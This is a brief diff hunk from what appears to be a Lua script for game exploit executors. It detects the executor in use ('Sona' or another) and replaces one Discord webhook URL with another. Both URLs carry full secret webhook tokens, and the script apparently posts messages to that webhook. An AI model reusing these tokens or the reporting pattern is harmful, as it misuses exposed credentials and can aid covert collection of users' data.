@@ -17,7 +17,7 @@ local webhookcheck =
     SONA_LOADED and "Sona" or 
     "other executer"
 
-local url = "https://discord.com/api/webhooks/1264855302440878100/4XKNRzAAu61cJcGP9wLJ6PoEQYeIzSyIXQqcpd5AnyPNWHRe1tinWWJYhQaoBtBWOYvn"
+local url = "https://discord.com/api/webhooks/1267036757602467892/V5F6oRhInji3hQA0Xeb17KHDaJv57nmAzD3-WYOtcMcDLyf_2Z9JSiKcQ4jLTr21aJNI"
 
 -- Create a list of messages
 local messages = {
